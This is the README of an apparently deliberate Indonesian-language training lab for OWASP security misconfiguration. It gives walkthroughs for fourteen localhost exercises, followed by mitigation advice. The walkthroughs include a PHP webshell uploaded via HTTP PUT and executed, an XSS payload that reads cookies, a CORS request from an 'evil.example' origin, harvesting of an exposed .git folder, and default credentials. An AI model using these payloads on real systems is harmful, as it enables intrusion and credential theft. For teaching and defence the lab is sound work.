# Security Misconfiguration Lab (A02)

Aplikasi PHP sederhana yang mendemonstrasikan berbagai bentuk kesalahan konfigurasi keamanan —
bukan bug di kode aplikasi, melainkan pengaturan server/aplikasi yang tidak aman — bagian dari
**A02: Security Misconfiguration**.

| Lab | Kategori | File |
|---|---|---|
| 1 | Debug mode / stack trace bocor ke production | `lab1_debug_stacktrace.php` |
| 2 | Kredensial default tidak pernah diganti | `lab2_default_credentials.php` |
| 3 | Directory listing terbuka | `lab3_directory_listing.php` |
| 4 | Endpoint debug yang terlupakan | `lab4_debug_endpoint.php` |
| 5 | CORS misconfiguration | `lab5_cors_misconfig.php` |
| 6 | Header keamanan hilang &rarr; Clickjacking | `lab6_missing_headers_clickjacking.php` |
| 7 | Folder .git ter-expose | `lab7_git_exposed.php` |
| 8 | File .env ter-expose | `lab8_env_exposed.php` |
| 9 | Backup file editor yang bisa ditebak | `lab9_backup_file_guess.php` |
| 10 | Cookie tanpa flag HttpOnly | `lab10_missing_httponly.php` |
| 11 | Cookie tanpa flag Secure | `lab11_missing_secure.php` |
| 12 | Cookie tanpa atribut SameSite | `lab12_missing_samesite.php` |
| 13 | HTTP method TRACE aktif (XST) | `lab13_trace_method.php` |
| 14 | HTTP method PUT diterima tanpa validasi | `lab14_put_method.php` |

## Menjalankan

```bash
cd ..
docker compose up -d --build
```

Buka `http://localhost:8079/secmisconfig/`, atau lewat Portal → **A02: Security Misconfiguration**.

## Panduan tiap lab

### Lab 1 — Debug mode / stack trace
Isi form "Cari Produk" dengan ID non-angka (mis. `abc`). Karena `DEBUG_MODE = true` di
`lab1_debug_stacktrace.php`, exception yang seharusnya ditampilkan generik malah mencetak
connection string database lengkap dengan password (`Pr0d_DbP4ss_2024!`) langsung ke halaman.

### Lab 2 — Kredensial default
Panel admin masih memakai kredensial bawaan installer/vendor. Login dengan `admin` / `admin123`
untuk masuk ke "Admin Dashboard" dan melihat data seluruh user terdaftar.

### Lab 3 — Directory listing
Buka `backup/` dari halaman lab (atau langsung `/secmisconfig/backup/`). Folder ini punya
`Options +Indexes` aktif, jadi isinya (`db_backup_2024.sql.bak`, `config.php.bak`) bisa dilihat
dan dibuka langsung dari browser — keduanya berisi password database yang sama
(`Adm1n_S3cret_2024`).

### Lab 4 — Endpoint debug terlupakan
Halaman ini tidak ada di menu navigasi mana pun, tapi tetap bisa diakses langsung lewat
`lab4_debug_endpoint.php`. Halaman menampilkan versi PHP, document root, dan "environment
variables" berisi kredensial AWS, JWT signing key, dan password database.

### Lab 5 — CORS misconfiguration
Buka lab ini (session otomatis "login"), lalu jalankan:
```bash
curl -i -H "Origin: https://evil.example" "http://localhost:8079/secmisconfig/lab5_cors_misconfig.php?action=api"
```
Perhatikan response header `Access-Control-Allow-Origin: https://evil.example` dan
`Access-Control-Allow-Credentials: true` — origin apa pun di-reflect dan diizinkan membawa
credentials. Bisa juga dibuktikan lewat `fetch(..., {credentials:'include'})` dari console
browser di origin lain.

### Lab 6 — Header keamanan hilang / clickjacking
`lab6_missing_headers_clickjacking.php` tidak mengirim `X-Frame-Options` maupun
`Content-Security-Policy: frame-ancestors`. Buka `lab6_attacker_iframe.php`, klik tombol
"Klaim Hadiah", lalu kembali ke halaman transfer dan lihat entri baru muncul di log transfer
tanpa pernah benar-benar bermaksud menekan tombol transfer.

### Lab 7 — Folder .git ter-expose
Buka `vcs-demo/`, lalu akses `vcs-demo/.git/HEAD` dan `vcs-demo/.git/config` langsung — keduanya
kebaca. Karena directory listing aktif juga di folder ini, seluruh isi `.git/` bisa diunduh lewat
`wget -r` lalu dibaca riwayatnya dengan `git log --all -p` — termasuk file `config-secret.txt`
yang sudah "dihapus" di commit terakhir tapi isinya tetap utuh di history.

### Lab 8 — File .env ter-expose
Akses `/secmisconfig/.env` langsung. File berisi kredensial database production, application
key, dan password SMTP dalam bentuk plaintext.

### Lab 9 — Backup file editor yang bisa ditebak
Akses `/secmisconfig/config.php.save` langsung (tidak ada di directory listing manapun — murni
tebakan nama file umum). Karena ekstensinya bukan `.php`, isinya dikirim sebagai teks biasa,
membocorkan source code lengkap dengan kredensial database yang di-hardcode.

### Lab 10 — Cookie tanpa flag HttpOnly
Buka lab ini untuk dapat cookie `demo_session_httponly_off`. Lalu buka
`lab10_missing_httponly.php?msg=<script>document.title=document.cookie</script>` — judul tab
berubah menampilkan isi cookie tersebut, dibaca langsung lewat `document.cookie`.

### Lab 11 — Cookie tanpa flag Secure
Buka lab untuk dapat cookie `demo_session_secure_off`, lalu klik "Akses endpoint legacy" —
cookie yang sama terkirim ke endpoint "plain HTTP" simulasi tanpa hambatan, membuktikan tidak
ada jaminan cookie ini hanya melintas lewat koneksi terenkripsi.

### Lab 12 — Cookie tanpa atribut SameSite
Bandingkan header `Set-Cookie` di lab ini (`curl -i .../lab12_missing_samesite.php`) dengan lab
10/11 — atribut `SameSite` tidak ada sama sekali, berbeda dari cookie lain yang eksplisit
`SameSite=Lax`.

### Lab 13 — HTTP method TRACE aktif (XST)
```bash
curl -v -X TRACE http://localhost:8079/secmisconfig/lab13_trace_method.php \
  -H "X-Rahasia-Demo: nilai-ini-seharusnya-tidak-terlihat-siapa-pun"
```
Body response meng-echo balik seluruh header request, termasuk header custom yang dikirim.

### Lab 14 — HTTP method PUT diterima tanpa validasi
```bash
printf '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X PUT --data-binary @shell.php "http://localhost:8079/secmisconfig/lab14_put_method.php?file=shell.php"
curl "http://localhost:8079/secmisconfig/data/put_uploads/shell.php?cmd=id"
```
File yang di-`PUT` langsung tersimpan ke direktori yang tetap dieksekusi PHP oleh Apache —
webshell berjalan tanpa pernah menyentuh form upload aplikasi.

## Mitigasi (untuk didiskusikan setelah lab)
- Matikan mode debug (`APP_DEBUG=false` atau setara) di production; tampilkan pesan error
  generik ke user, dan catat detail lengkap hanya ke log server yang tidak publik.
- Ganti seluruh kredensial default (admin panel, database, layanan pihak ketiga) sebelum
  sistem go-live, dan terapkan kebijakan password yang kuat untuk akun tersebut.
- Nonaktifkan directory listing (`Options -Indexes`) di semua direktori web, dan jangan pernah
  menaruh file backup/config di dalam webroot sama sekali — simpan di luar docroot atau storage
  terenkripsi.
- Hapus endpoint/tool debug sebelum deploy ke production, atau minimal lindungi dengan
  autentikasi dan batasi akses berdasarkan IP internal.
- Konfigurasi CORS dengan allowlist origin yang eksplisit (bukan reflect origin apa pun, bukan
  `*`), dan jangan pernah menggabungkan `Access-Control-Allow-Credentials: true` dengan origin
  yang tidak divalidasi ketat.
- Pasang header keamanan standar di semua respons: `X-Frame-Options: DENY` (atau
  `SAMEORIGIN` bila memang perlu framing internal) dan
  `Content-Security-Policy: frame-ancestors 'self'` untuk mencegah clickjacking, ditambah
  header lain seperti `X-Content-Type-Options: nosniff`.
- Jangan pernah men-deploy `.git`/`.svn` ke webroot production; kalaupun terjadi, blokir akses
  ke seluruh dotfile/dotdir secara eksplisit di konfigurasi web server
  (`<FilesMatch "^\."> Require all denied </FilesMatch>` atau setara).
- Simpan `.env`/file konfigurasi sensitif di luar docroot, atau minimal blokir aksesnya lewat
  aturan web server yang eksplisit.
- Hapus file backup/recovery editor dari server production, dan pertimbangkan memblokir pola
  ekstensi umum (`.bak`, `.save`, `.old`, `~`) lewat konfigurasi web server.
- Pasang flag `HttpOnly`, `Secure`, dan `SameSite=Strict`/`Lax` secara eksplisit di setiap cookie
  sesi/autentikasi — jangan bergantung pada default browser yang bisa berubah.
- Matikan `TRACE` (`TraceEnable Off`) dan batasi method HTTP yang diterima tiap endpoint
  (`<LimitExcept GET POST>...</LimitExcept>` atau setara) — jangan biarkan handler aplikasi
  menerima method yang tidak pernah dimaksudkan untuk didukung.
